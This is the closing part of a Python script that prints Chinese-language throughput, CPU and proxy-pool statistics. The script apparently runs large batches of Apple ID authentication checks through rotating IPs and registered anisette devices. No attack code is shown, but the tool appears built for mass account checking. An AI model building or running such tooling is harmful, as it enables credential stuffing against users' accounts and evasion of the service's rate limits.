        final['incomplete'] = results['incomplete']
        final['elapsed'] = round(wall, 1)
        device_registered = count_registered_devices(
            args.device_root, 'https://new.ani.sidestore.io')
        final['device_ready'] = device_registered
        final['device_registered'] = device_registered
        final['device_in_use'] = len(results['device_in_use'])
        final['device_registering'] = len(results['device_registering'])
        final['register_errors'] = results['register_errors']
        final['register_error_types'] = dict(results['register_error_types'])
        final['startup'] = dict(final.get('startup') or {},
                                phase='complete' if results['incomplete'] == 0 else 'stopped',
                                message='任务已完成' if results['incomplete'] == 0 else '任务未完整完成',
                                elapsed=round(wall, 1))
        with open(args.live, 'w', encoding='utf-8') as handle:
            json.dump(final, handle, ensure_ascii=False)
    except OSError:
        pass

    done = results['done']
    cpu = results['cpu']
    print('\n=== 结果 ===')
    print(f'完成 {done} 条 / 墙钟 {wall:.1f}s = {done / wall:.1f} 条/秒 '
          f'= {done / wall * 3600 / 10000:.1f} 万/小时')
    proc_cpu = time.process_time() - proc_cpu_start
    main_cpu = time.thread_time() - main_cpu0
    print(f'CPU 记账（同一个进程内，互不重叠）:')
    print(f'  业务线程合计  {cpu:.2f}s = {cpu / wall:.2f} 核'
          f'  单条 {cpu / done * 1000 if done else 0:.1f} ms')
    print(f'  整进程        {proc_cpu:.2f}s = {proc_cpu / wall:.2f} 核')
    print(f'  主线程        {main_cpu:.2f}s = {main_cpu / wall:.2f} 核'
          f'  （含 live 写盘、JSON 序列化）')
    sup = getattr(ip_pool, 'cpu_supplier', 0.0) if ip_pool is not None else 0.0
    snap = (ip_pool.stats.get('cpu_snapshot', 0.0)
            if ip_pool is not None else 0.0)
    rest = proc_cpu - cpu - main_cpu - sup
    print(f'  补池线程      {sup:.2f}s = {sup / wall:.2f} 核')
    print(f'  其中快照      {snap:.2f}s')
    print(f'  未归因        {rest:.2f}s = {rest / wall:.2f} 核'
          f'  （初始化、设备注册、线程创建）')
    print(f'每线程 CPU 中位 {statistics.median(results["per_thread_cpu"]):.0f} ms，'
          f'每线程条数 中位 {statistics.median(results["per_thread_count"]):.0f}')
    print(f'IP 获取失败线程 {results["ip_fail"]}')
    try:
        from fastcheck.protocols.gsa_status import stage_cpu_summary
        stages = stage_cpu_summary()
    except Exception:
        stages = {}
    if stages:
        print('gs.check 内部阶段（毫秒）:')
        for k in ('srp_ctor', 'client_setup', 'init_dumps', 'http_init_total',
                  'srp_challenge', 'done_dumps', 'http_complete_total'):
            if k in stages:
                n, med, mx = stages[k]
                print(f'  {k:<22} p50={med:8.2f}  max={mx:8.2f}  n={n}')
        print()
    boot = results.get('boot_segments') or {}
    if boot:
        print('线程启动分段（CPU 毫秒，中位数）:')
        for k in ('pool_ctor', 'info', 'profile', 'client_ctor',
                  'register_cpu', 'register_wall'):
            vals = sorted(boot.get(k) or [])
            if vals:
                label = 'register_wall' if k == 'register_wall' else k
                print(f'    {label:<16} p50={statistics.median(vals):7.2f}  '
                      f'max={vals[-1]:8.2f}  n={len(vals)}')
    hit, fetch = results.get('otp_hit', 0), results.get('otp_fetch', 0)
    if hit or fetch:
        print(f'公共头: 复用命中 {hit} 条 · 真实拉取 {fetch} 次 · '
              f'复用率 {hit/(hit+fetch)*100:.1f}%')
    if results.get('budget_hit'):
        print(f'预算耗尽: {results["budget_hit"]} 条（超过 {args.item_timeout:.0f}s 直接判超时）')
    if results.get('retried'):
        print(f'重试: {results["retried"]} 条触发 · 原因分布 {results.get("by_retry")}')
    if ip_pool is not None:
        snap = ip_pool.snapshot()
        ip_pool.stop()
        print(f'IP 池: API {snap["api_calls"]} 次 / 拉取 {snap["fetched"]} 条 / '
              f'预热 {snap["warmed"]} 条 / 去重 {snap["duplicate"]}')
        print(f'       取用: 本地命中 {snap["local_hit"]} 次 · 共享命中 {snap["shared_hit"]} 次 · '
              f'阻塞 {snap["blocked"]} 次')
        print(f'       淘汰: 丢弃 {snap["discarded"]} 过期 {snap["expired"]} · '
              f'在册 {snap["tracked"]} 条')
    print(f'状态（原始 result_bucket 口径）: {results["by_status"]}')
    print(f'状态（classify 裸口径）      : {results.get("by_raw")}')
    if results.get('by_web'):
        print(f'web 复核结果                 : {results["by_web"]}')
        if results.get('by_method'):
            print('au=repair 的 web 细化结果:')
            for key, value in sorted(results['by_method'].items(),
                                     key=lambda kv: -kv[1]):
                print(f'    {key:<34} {value}')
        print('交叉表（GSA → web）:')
        for key, value in sorted((results.get('cross') or {}).items(),
                                 key=lambda kv: -kv[1]):
            print(f'    {key:<34} {value}')
    seg = results.get('seg') or {}
    print('业务循环 CPU 拆分（毫秒，中位数）:')
    for name, label in (('otp_cpu', '取公共头'), ('chk_cpu', '打 Apple(CPU)'),
                        ('bucket_cpu', '分类'), ('tail_cpu', '记录/其他')):
        vals = sorted(seg.get(name) or [])
        if vals:
            print(f'  {label:<14} p50={statistics.median(vals):7.2f}  '
                  f'p90={vals[int(len(vals)*0.9)]:7.2f}  max={vals[-1]:8.2f}')
    print()
    for name, label in (('ip', '取 IP(墙钟)'), ('gap', '轮间空档'), ('otp', '取公共头(墙钟)'),
                        ('chk', '打 Apple(墙钟)')):
        vals = sorted(seg.get(name) or [])
        if vals:
            n = len(vals)
            print(f'{label} 耗时 p50={statistics.median(vals):6.0f}ms '
                  f'p90={vals[int(n*.9)]:6.0f}ms max={vals[-1]:6.0f}ms '
                  f'合计 {sum(vals)/1000:.1f}s')
    ms = sorted(r['ms'] for r in results['samples'])
    if ms:
        n = len(ms)
        print(f'单条墙钟 p50={statistics.median(ms):.0f}ms p90={ms[int(n*.9)]:.0f}ms '
              f'max={max(ms):.0f}ms（采样 {n} 条）')
    tc = sorted(r['thread_cpu_ms'] for r in results['samples'])
    if tc:
        print(f'单条线程 CPU p50={statistics.median(tc):.1f}ms max={max(tc):.1f}ms')
    expected = len(rows)
    if done != expected:
        missing = expected - done
        print(f'⚠ 未完成：预期 {expected} 条，实际 {done} 条，缺 {missing} 条'
              f'（线程提前退出/设备注册失败/任务异常）')
        results['incomplete'] = missing
    print(f'明细 {args.out}')


if __name__ == '__main__':
    main()
